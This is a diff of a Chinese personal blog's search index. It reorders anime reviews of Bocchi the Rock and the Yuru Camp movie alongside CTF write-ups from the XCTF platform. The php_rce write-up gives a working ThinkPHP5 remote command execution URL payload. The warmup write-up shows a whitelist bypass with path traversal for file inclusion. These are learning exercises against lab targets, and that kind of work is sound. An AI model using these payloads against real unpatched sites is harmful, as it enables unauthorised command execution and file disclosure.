-<h1 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h1><p>虽然只有短短12话，我却看得十分尽兴。<br>第5话，第8话，第12话这三段演奏都做得非常好，即便如此，还是有部分人不满，原因很简单，没有爆点。追求快的时代，拿不出一个爆点的话，那么是很难吸引快节奏人的目光的。从我个人的意愿来说，也不例外，希望有能够惊为天人的live。虽然没有期待到啦，不过也不至于成为挑刺的地方。三段演奏都是蛮棒的，写实的风格，创新的演出，越看越耐看的live，都是无可挑剔的。<br>最喜欢的角色嘛，是虹夏。现在虹夏已经被大家尊称为“下北泽の大天使”了hhh。<br>如果说我在四个人里最像凉，那么大概也能明白为什么一开始凉是和虹夏一起的了。若要问喜欢的原因，大概是那份细腻感吧，能够注意到乐队其他人不会注意到的事，而且还那么温柔，与喜多那种外向的阳光普照大地不同，虹夏的阳光是单独照射着她所在意的人的。还有也非常可爱啊，第5话最后那个告别怎能叫人不心动呢！<br><img src="/images/%E8%99%B9%E5%A4%8F_4.gif" alt="虹夏告别"></p>
-<h1 id="总的来说"><a href="#总的来说" class="headerlink" title="总的来说"></a>总的来说</h1><p>赶紧出下一季！</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>动画评价写得好烂，还写了那么久，什么时候能写好一点啊！</p>
-]]></content>
-      <categories>
-        <category>动画</category>
-        <category>孤独摇滚</category>
-      </categories>
-      <tags>
-        <tag>孤独摇滚</tag>
       </tags>
   </entry>
   <entry>
@@ -7162,6 +7182,27 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
+    <title>搖曳露营movie--仰望星空的童话</title>
+    <url>/2022/11/14/%E6%90%96%E6%9B%B3%E9%9C%B2%E8%90%A5movie/</url>
+    <content><![CDATA[<p><img src="/images/yuru4.png" alt="搖曳露营"></p>
+<span id="more"></span>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>未看电影前，零星评论让我以为会比较沉重的电影，欣赏过程中一直提心吊胆的，生怕发生点什么。但幸好，还是TV动画的味道，对于我这样一个单纯享受故事的<font color=Yellow>粉丝</font>而言，看完后很满足。<br>看的过程中，其实也感受到了<font color=orange>一点异样</font>，但为了保持良好的观影感受，我选择了忽略。既然要写影评，就应当把好的坏的都拿出来说。</p>
+<p><img src="/images/%E5%BF%97%E6%91%A9%E5%87%9B6.png" alt="凛"></p>
+<h1 id="坚守的延续"><a href="#坚守的延续" class="headerlink" title="坚守的延续"></a>坚守的延续</h1><p>虽说是电影，可其实和TV动画的差别并没有那么大。看过TV动画再来看电影的人，是熟悉的味道。<br>要说最大区别在哪里，那必然是长大了后的女孩们。通过电影一些细节猜测，设定在7-10年后，除了女孩们有所改变，其他人都是熟悉而无所变化的。当然，毕竟电影只有2小时，这些人的改变是完全不够篇幅的。<br><img src="/images/%E6%8A%9A%E5%AD%902.png" alt="抚子"><br><font color=blue>凛</font>成了挤电车的编辑部撰稿人，<font color=blue>抚子</font>是露营店的店员，<font color=blue>葵</font>是小学教师，<font color=blue>惠那</font>是宠物店的店员，<font color=blue>千明</font>在旅游振兴机构工作。<br>每个人的职业都相当的简单易懂。单论她们的职业，从她们每天过得情况来看，其实是相当理想的吧。不过还是能从中看出社会人的一些心酸，比如凛加班啊，葵所在的学校拆掉了啊，千明从东京辞职啊之类的。我们可以看出，制作组对于本动画是极力想要维持TV动画的氛围，因此而舍弃了社会上阴暗沉重的部分，转而把重心维持在美好的一面。可以看出，电影是面向粉丝以及想要轻松观看的人群。也就是说，其实受到了前作限制，不能发挥出更具自我的风格。<font color=SeaGreen>电影内的女孩们的现实约束少了，可电影外的制作组约束却多了。</font><br><img src="/images/%E5%BF%97%E6%91%A9%E5%87%9B5.png" alt="搖曳露营"><br>对于不同立场的人，评价也就自然不同了，单论粉丝，我想是相对满意的。对于社会人，可能因为没有表达出他们在社会的心酸而没那么满意。站在一个更高的台阶上看，是能做到更深刻却没做到，造成了部分人的失望。<br><font color=SeaGreen>但无论如何，对于一般人，这部电影也是值得看一遍的，仅一遍。当然，粉丝另论。</font></p>
+<p><img src="/images/%E5%87%9B+%E6%8A%9A%E5%AD%907.png" alt="凛和抚子"></p>
+<h1 id="后劲不足"><a href="#后劲不足" class="headerlink" title="后劲不足"></a>后劲不足</h1><p><font color=red>电影提出了一个很有意思的话题，传承</font>。是抚子和凛在泡温泉的时候提出来的。这就从第一季的自然享受，第二季的人文情怀，拔升到了电影的露营传承。正因为想要和别人分享这种露营的乐趣，所以建立了这个露营场。虽然电影里没有多少实际的完整露营，但依然是搖曳露营的精神在参与。让她们传递乐趣给别人的根本原因，在于对露营的热爱。而每个人，都应有自己所热爱的事物，也就能明白露营女孩们为何能热情参与建立露营场。我自身也对此颇有感触，热爱动画的我，又在多少个夜里，幻想能自己创立一家动画公司，幻想自己参与一部动画的制作…<br><img src="/images/yuru3.png" alt="搖曳露营"><br>电影的现实上，是很让人匪夷所思的。明明凛单程就需要4小时，她们又都不在同一个地方，却让人感觉随时都有时间一起待在露营场，搭建过程中也从未遇到大的挫折。<font color=SlateGray>不由得让人觉得，是不是有些童话了呢？</font>又或许，制作组本意就是做出成人的童话？这样一来，就感受到了电影水平上升受到了限制，有种流于表面的感觉。多一些遭遇困难，面对困境的细节，我想会更棒吧。<br><img src="/images/%E7%8A%AC%E5%B1%B1%E8%91%B52.png" alt="搖曳露营"><br>老实说，结构非常地普通，从欢乐到哀伤再到欢乐，有些地方有点刻意，很遗憾没有发挥出作为电影的特点。<br><font color=Fuchsia>总而言之，电影是佳作，TV动画是神作。</font></p>
+]]></content>
+      <categories>
+        <category>动画</category>
+        <category>搖曳露营</category>
+      </categories>
+      <tags>
+        <tag>动画</tag>
+        <tag>搖曳露营</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>攻防世界-Web_php_unserialize</title>
     <url>/2022/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web_php_unserialize/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>没注意到细节会吃亏。</p>
@@ -7181,27 +7222,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       <tags>
         <tag>CTF</tag>
         <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>搖曳露营movie--仰望星空的童话</title>
-    <url>/2022/11/14/%E6%90%96%E6%9B%B3%E9%9C%B2%E8%90%A5movie/</url>
-    <content><![CDATA[<p><img src="/images/yuru4.png" alt="搖曳露营"></p>
-<span id="more"></span>
-
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>未看电影前，零星评论让我以为会比较沉重的电影，欣赏过程中一直提心吊胆的，生怕发生点什么。但幸好，还是TV动画的味道，对于我这样一个单纯享受故事的<font color=Yellow>粉丝</font>而言，看完后很满足。<br>看的过程中，其实也感受到了<font color=orange>一点异样</font>，但为了保持良好的观影感受，我选择了忽略。既然要写影评，就应当把好的坏的都拿出来说。</p>
-<p><img src="/images/%E5%BF%97%E6%91%A9%E5%87%9B6.png" alt="凛"></p>
-<h1 id="坚守的延续"><a href="#坚守的延续" class="headerlink" title="坚守的延续"></a>坚守的延续</h1><p>虽说是电影，可其实和TV动画的差别并没有那么大。看过TV动画再来看电影的人，是熟悉的味道。<br>要说最大区别在哪里，那必然是长大了后的女孩们。通过电影一些细节猜测，设定在7-10年后，除了女孩们有所改变，其他人都是熟悉而无所变化的。当然，毕竟电影只有2小时，这些人的改变是完全不够篇幅的。<br><img src="/images/%E6%8A%9A%E5%AD%902.png" alt="抚子"><br><font color=blue>凛</font>成了挤电车的编辑部撰稿人，<font color=blue>抚子</font>是露营店的店员，<font color=blue>葵</font>是小学教师，<font color=blue>惠那</font>是宠物店的店员，<font color=blue>千明</font>在旅游振兴机构工作。<br>每个人的职业都相当的简单易懂。单论她们的职业，从她们每天过得情况来看，其实是相当理想的吧。不过还是能从中看出社会人的一些心酸，比如凛加班啊，葵所在的学校拆掉了啊，千明从东京辞职啊之类的。我们可以看出，制作组对于本动画是极力想要维持TV动画的氛围，因此而舍弃了社会上阴暗沉重的部分，转而把重心维持在美好的一面。可以看出，电影是面向粉丝以及想要轻松观看的人群。也就是说，其实受到了前作限制，不能发挥出更具自我的风格。<font color=SeaGreen>电影内的女孩们的现实约束少了，可电影外的制作组约束却多了。</font><br><img src="/images/%E5%BF%97%E6%91%A9%E5%87%9B5.png" alt="搖曳露营"><br>对于不同立场的人，评价也就自然不同了，单论粉丝，我想是相对满意的。对于社会人，可能因为没有表达出他们在社会的心酸而没那么满意。站在一个更高的台阶上看，是能做到更深刻却没做到，造成了部分人的失望。<br><font color=SeaGreen>但无论如何，对于一般人，这部电影也是值得看一遍的，仅一遍。当然，粉丝另论。</font></p>
-<p><img src="/images/%E5%87%9B+%E6%8A%9A%E5%AD%907.png" alt="凛和抚子"></p>
-<h1 id="后劲不足"><a href="#后劲不足" class="headerlink" title="后劲不足"></a>后劲不足</h1><p><font color=red>电影提出了一个很有意思的话题，传承</font>。是抚子和凛在泡温泉的时候提出来的。这就从第一季的自然享受，第二季的人文情怀，拔升到了电影的露营传承。正因为想要和别人分享这种露营的乐趣，所以建立了这个露营场。虽然电影里没有多少实际的完整露营，但依然是搖曳露营的精神在参与。让她们传递乐趣给别人的根本原因，在于对露营的热爱。而每个人，都应有自己所热爱的事物，也就能明白露营女孩们为何能热情参与建立露营场。我自身也对此颇有感触，热爱动画的我，又在多少个夜里，幻想能自己创立一家动画公司，幻想自己参与一部动画的制作…<br><img src="/images/yuru3.png" alt="搖曳露营"><br>电影的现实上，是很让人匪夷所思的。明明凛单程就需要4小时，她们又都不在同一个地方，却让人感觉随时都有时间一起待在露营场，搭建过程中也从未遇到大的挫折。<font color=SlateGray>不由得让人觉得，是不是有些童话了呢？</font>又或许，制作组本意就是做出成人的童话？这样一来，就感受到了电影水平上升受到了限制，有种流于表面的感觉。多一些遭遇困难，面对困境的细节，我想会更棒吧。<br><img src="/images/%E7%8A%AC%E5%B1%B1%E8%91%B52.png" alt="搖曳露营"><br>老实说，结构非常地普通，从欢乐到哀伤再到欢乐，有些地方有点刻意，很遗憾没有发挥出作为电影的特点。<br><font color=Fuchsia>总而言之，电影是佳作，TV动画是神作。</font></p>
-]]></content>
-      <categories>
-        <category>动画</category>
-        <category>搖曳露营</category>
-      </categories>
-      <tags>
-        <tag>动画</tag>
-        <tag>搖曳露营</tag>
       </tags>
   </entry>
   <entry>
@@ -7436,6 +7456,31 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
+    <title>攻防世界-php_rce</title>
+    <url>/2023/01/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一道关于ThinkPHP5框架的命令执行漏洞。</p>
+<span id="more"></span>
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>查资料<br>打开页面后，发现是一个ThinkPHP5框架。<br>在GitHub上搜索，“ThinkPHP5 漏洞” 找到可以利用的类似payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:63034/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure>
+<p>成功打开phpinfo界面，说明payload有效。</p>
+</li>
+<li><p>构造payload<br>由于我们是需要找到flag，那么就构造能够显示payload的语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:63034/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /f*</span><br></pre></td></tr></table></figure>
+<p>成功拿到flag</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>RCE</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>RCE</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>攻防世界-unserialize3</title>
     <url>/2022/12/25/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-unserialize3/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>是我做的第一道反序列化的ctf呢。</p>
@@ -7465,28 +7510,56 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
-    <title>攻防世界-php_rce</title>
-    <url>/2023/01/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一道关于ThinkPHP5框架的命令执行漏洞。</p>
+    <title>攻防世界-warmup</title>
+    <url>/2022/12/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-warmup/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>自己的缺陷在于对于php代码还不甚熟练</p>
 <span id="more"></span>
 <h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>查资料<br>打开页面后，发现是一个ThinkPHP5框架。<br>在GitHub上搜索，“ThinkPHP5 漏洞” 找到可以利用的类似payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:63034/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure>
-<p>成功打开phpinfo界面，说明payload有效。</p>
+<li><p>后台扫描<br>使用DirBuster工具扫描，可知source.php可以打开。<br>打开后是一段php代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我们注意到还有一个hint.php页面，于是打开该页面，发现提示我们flag在ffffllllaaaagggg里。</p>
 </li>
-<li><p>构造payload<br>由于我们是需要找到flag，那么就构造能够显示payload的语句：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:63034/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /f*</span><br></pre></td></tr></table></figure>
-<p>成功拿到flag</p>
+<li><p>分析代码</p>
 </li>
 </ol>
+<ul>
+<li><p>变量前的&amp;符号<br>$变量前加&amp;符号，表示引用，也即引用传递。</p>
+</li>
+<li><p>白名单数组</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>is_string()函数<br>该函数是判断内部的变量是否为字符串</p>
+</li>
+<li><p>mb_substr()函数<br>该函数是获取部分字符串</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$str</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$start</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$length</span> = <span class="literal">NULL</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="title function_ invoke__">mb_internal_encoding</span>()</span><br><span class="line">): <span class="keyword">string</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">str</span></span><br><span class="line"><span class="comment">从该 string 中提取子字符串。</span></span><br><span class="line"><span class="comment">start</span></span><br><span class="line"><span class="comment">如果 start 不是负数，返回的字符串会从 str 第 start 的位置开始，从 0 开始计数。举个例子，字符串 &#x27;abcdef&#x27;，位置 0 的字符是 &#x27;a&#x27;，位置 2 的字符是 &#x27;c&#x27;，以此类推。</span></span><br><span class="line"><span class="comment">如果 start 是负数，返回的字符串是从 str 末尾处第 start 个字符开始的。</span></span><br><span class="line"><span class="comment">length</span></span><br><span class="line"><span class="comment">str 中要使用的最大字符数。如果省略了此参数或者传入了 NULL，则会提取到字符串的尾部。</span></span><br><span class="line"><span class="comment">encoding</span></span><br><span class="line"><span class="comment">encoding 参数为字符编码。如果省略或是 null，则使用内部字符编码。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<p>根据字符数执行一个多字节安全的 substr() 操作。 位置是从 str 的开始位置进行计数。 第一个字符的位置是 0。第二个字符的位置是 1，以此类推。</p>
+</li>
+<li><p>mb_strpos()函数<br>该函数是查找字符串在另一个字符串中首次出现的位置</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_strpos</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$haystack</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$needle</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="title function_ invoke__">mb_internal_encoding</span>()</span><br><span class="line">): <span class="keyword">int</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">haystack</span></span><br><span class="line"><span class="comment">要被检查的 string。</span></span><br><span class="line"><span class="comment">needle</span></span><br><span class="line"><span class="comment">在 haystack 中查找这个字符串。 和 strpos() 不同的是，数字的值不会被当做字符的顺序值。</span></span><br><span class="line"><span class="comment">offset</span></span><br><span class="line"><span class="comment">搜索位置的偏移。如果没有提供该参数，将会使用 0。负数的 offset 会从字符串尾部开始统计。</span></span><br><span class="line"><span class="comment">encoding</span></span><br><span class="line"><span class="comment">encoding 参数为字符编码。如果省略或是 null，则使用内部字符编码。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<p>基于字符数执行一个多字节安全的 strpos() 操作。 第一个字符的位置是 0，第二个字符的位置是 1，以此类推。</p>
+</li>
+<li><p>is_array()函数<br>该函数是判断第1个变量是否在第2个数组中</p>
+</li>
+<li><p>empty()函数<br>该函数是检查变量是否为空。<br>当变量不存在、值为空、等于 0、为 false 时，返回 true。否则返回 false。</p>
+</li>
+<li><p>emmm::checkFile()<br>输出emmm函数的返回值</p>
+</li>
+</ul>
+<p>PHP函数代码都解析完毕后，那么我们可以知道传入的参需要满足以下条件：<br>不为空，是字符串，<br>第1个问号(?)前的字符在白名单内</p>
+<ol start="3">
+<li>构造语句<br>我们已经知道了条件，接下来就是构造语句来满足条件。可以看到有include函数，所以我们想到文件包含漏洞。<br>使用目录穿越（..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;）的方式可以访问到父目录，从而访问到ffffllllaaaagggg。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=hint.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+拿到flag</li>
+</ol>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>PHP代码看得太少了，导致一堆代码都看不懂！</p>
 ]]></content>
       <categories>
         <category>CTF</category>
-        <category>RCE</category>
+        <category>文件包含</category>
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>RCE</tag>
+        <tag>PHP</tag>
+        <tag>文件包含</tag>
       </tags>
   </entry>
   <entry>
@@ -7557,56 +7630,53 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
-    <title>攻防世界-warmup</title>
-    <url>/2022/12/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-warmup/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>自己的缺陷在于对于php代码还不甚熟练</p>
+    <title>攻防世界_easyphp</title>
+    <url>/2022/12/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_easyphp/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做了这题才知道自己的php掌握的有多么糟糕…</p>
 <span id="more"></span>
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>后台扫描<br>使用DirBuster工具扫描，可知source.php可以打开。<br>打开后是一段php代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>我们注意到还有一个hint.php页面，于是打开该页面，发现提示我们flag在ffffllllaaaagggg里。</p>
+<h1 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h1><p>攻防世界-&gt;easyphp</p>
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p>首先是页面代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span 